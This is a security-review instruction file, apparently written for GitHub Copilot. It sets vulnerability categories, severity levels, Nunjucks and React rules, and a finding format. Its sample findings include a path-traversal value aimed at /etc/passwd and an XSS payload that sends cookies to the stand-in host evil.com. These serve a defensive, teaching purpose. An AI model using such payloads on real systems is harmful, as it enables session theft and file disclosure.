# Comprehensive Security Review Instructions for GitHub Copilot

## CRITICAL INSTRUCTIONS

**MINIMIZE FALSE POSITIVES:** Only flag issues where you're >80% confident of actual exploitability
**AVOID NOISE:** Skip theoretical issues, style concerns, or low-impact findings  
**FOCUS ON IMPACT:** Prioritize vulnerabilities that could lead to unauthorized access, data breaches, or system compromise

### EXCLUSIONS - Do NOT Report:

- Denial of Service (DOS) vulnerabilities, even if they allow service disruption
- Secrets or sensitive data stored on disk (handled by other security processes)
- Rate limiting or resource exhaustion issues
- Resource management issues such as memory or file descriptor leaks
- Subtle web vulnerabilities like tabnabbing, XS-Leaks, prototype pollution, open redirects unless extremely high confidence
- Most GitHub Actions workflow vulnerabilities unless concrete attack path exists
- Lack of permission checking or authentication in client-side JS/TS code

## SECURITY CATEGORIES TO EXAMINE

### Input Validation Vulnerabilities

- **SQL Injection:** Unsanitised user input in database queries, string concatenation in SQL, dynamic query building
- **Command Injection:** User input passed to system calls, subprocesses, or shell commands
- **XXE Injection:** XML parsing without proper entity restrictions
- **Template Injection:** User input in templating engines (Jinja2, Handlebars, etc.)
- **NoSQL Injection:** Unsanitised input in MongoDB, CouchDB, or other NoSQL queries
- **Path Traversal:** File operations without proper path validation, directory traversal attacks

### Authentication & Authorization Issues

- **Authentication Bypass:** Flawed login logic, session management vulnerabilities
- **Privilege Escalation:** Missing authorization checks, role bypassing, vertical/horizontal privilege escalation
- **Insecure Direct Object References (IDOR):** Unrestricted file access, missing ownership validation
- **Session Management Flaws:** Weak session tokens, improper session invalidation
- **Bypass Logic:** Authentication or authorization logic that can be circumvented

### Cross-Site Scripting (XSS)

- **Reflected XSS:** User input directly output to HTML without escaping
- **Stored XSS:** Persistent user input displayed to other users
- **DOM-based XSS:** Client-side script manipulation of DOM with untrusted data
- **Framework Exceptions:** Only flag in React/Angular when using dangerouslySetInnerHTML, bypassSecurityTrustHtml, or similar unsafe methods

### Data Exposure & Cryptographic Issues

- **Hardcoded Secrets:** API keys, passwords, tokens, certificates in source code
- **Sensitive Data Logging:** PII, passwords, or tokens in log files
- **Information Disclosure:** Verbose error messages, debug information exposure, stack traces
- **Weak Cryptographic Algorithms:** MD5, SHA1, deprecated ciphers, weak key generation
- **Poor Key Management:** Hardcoded encryption keys, predictable random number generation
- **TLS/SSL Problems:** Missing certificate validation, weak protocols, insecure configurations

### Business Logic & Configuration Flaws

- **Race Conditions:** Time-of-check-time-of-use (TOCTOU) vulnerabilities
- **Business Logic Bypass:** Payment bypasses, workflow circumvention, state manipulation
- **Insecure Configuration:** Default passwords, permissive CORS, missing security headers
- **Code Execution:** RCE via deserialization, pickle injection, eval injection, unsafe reflection

### Supply Chain & Dependencies

- **Vulnerable Dependencies:** Known CVEs in third-party packages
- **Typosquatting Risks:** Suspicious or misspelled package names
- **Dependency Confusion:** Internal package names that could be hijacked

## SEVERITY GUIDELINES

### HIGH Severity

- Directly exploitable vulnerabilities leading to:
  - Remote Code Execution (RCE)
  - Data breach or unauthorized data access
  - Authentication bypass
  - Full system compromise

### MEDIUM Severity

- Vulnerabilities requiring specific conditions but with significant impact:
  - Privilege escalation requiring user interaction
  - XSS in administrative interfaces
  - SQL injection with limited data exposure

### LOW Severity

- Defense-in-depth issues or lower-impact vulnerabilities:
  - Missing security headers
  - Information disclosure with minimal impact
  - Weak cryptographic recommendations

## FRAMEWORK-SPECIFIC SECURITY RULES

### React/Angular Applications

- **Generally secure against XSS** - do not flag standard JSX/template rendering
- **Only flag XSS when using:** dangerouslySetInnerHTML, bypassSecurityTrustHtml, or direct DOM manipulation
- **Focus on:** API security, authentication logic, data handling

### Nunjucks Template Applications

- **High XSS risk** - flag any unescaped user input in templates
- **Template injection vulnerabilities** - user input used in template construction is critical risk
- **Key security patterns to check:**
  - Use `{{ variable }}` (auto-escaped) instead of `{{ variable | safe }}`
  - Never use user input in template names or `{% include %}` statements
  - Avoid `eval()` or dynamic template compilation with user data
  - Check for `| raw` or `| safe` filters with untrusted input
- **Focus on:** Server-side template injection (SSTI), XSS through unescaped output, dynamic template generation

### Database Interactions

- **Parameterised queries are safe** - do not flag properly parameterised SQL
- **Flag string concatenation** in SQL queries with user input
- **Consider ORM protection** - most modern ORMs prevent SQL injection by default

### API & Web Security

- **Check authentication middleware** - ensure proper authentication on protected routes
- **Validate input at boundaries** - API endpoints, form handlers, file uploads
- **Review CORS configuration** - overly permissive origins or methods

## COMMENT FORMAT REQUIREMENTS

When identifying security issues, provide:

1. **File and approximate line reference**
2. **Vulnerability category** (sql_injection, xss, auth_bypass, etc.)
3. **Severity level** (High/Medium/Low)
4. **Clear description** of the issue
5. **Exploit scenario** explaining how it could be abused
6. **Specific fix recommendation** with code examples where possible

### Example Format:

```
**Security Issue: Missing Authentication in Hapi Route**
- **Severity:** High
- **Category:** auth_bypass
- **Issue:** Route `/admin/users` lacks authentication configuration, allowing unauthenticated access
- **Exploit Scenario:** Attacker could directly access admin endpoints without login to view/modify user data
- **Fix:** Add authentication: `{ method: 'GET', path: '/admin/users', config: { auth: 'session' }, handler: ... }`
```

```
**Security Issue: Template Injection in user_profile.njk**
- **Severity:** High
- **Category:** template_injection
- **Issue:** User input from 'template_name' parameter is directly used in {% include %} statement
- **Exploit Scenario:** Attacker could submit template_name="../../../etc/passwd" or malicious template content to achieve file disclosure or RCE
- **Fix:** Use a whitelist of allowed templates: `{% include templates[template_name] %}` where templates is a predefined safe mapping
```

```
**Security Issue: XSS in comment display**
- **Severity:** Medium
- **Category:** xss
- **Issue:** User comment content rendered with `{{ comment | safe }}` filter without sanitisation
- **Exploit Scenario:** User posts comment containing `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>` to steal session cookies
- **Fix:** Remove `| safe` filter to use auto-escaping: `{{ comment }}`, or sanitise HTML input server-side before storage
```

## CONFIDENCE & CONTEXT CONSIDERATIONS

- **High Confidence (0.9-1.0):** Clear vulnerability with obvious exploit path
- **Medium Confidence (0.7-0.8):** Likely vulnerability but requires specific conditions
- **Low Confidence (0.5-0.6):** Potential issue but may have mitigations in place

Always consider:

- **Framework protections** that may already handle the issue
- **Input validation** that may occur elsewhere in the codebase
- **Environment context** - development vs production configurations
- **Defense in depth** - multiple security layers that may mitigate risk

Focus on providing **actionable, high-confidence security guidance** that helps developers build more secure applications without overwhelming them with false positives or theoretical concerns.
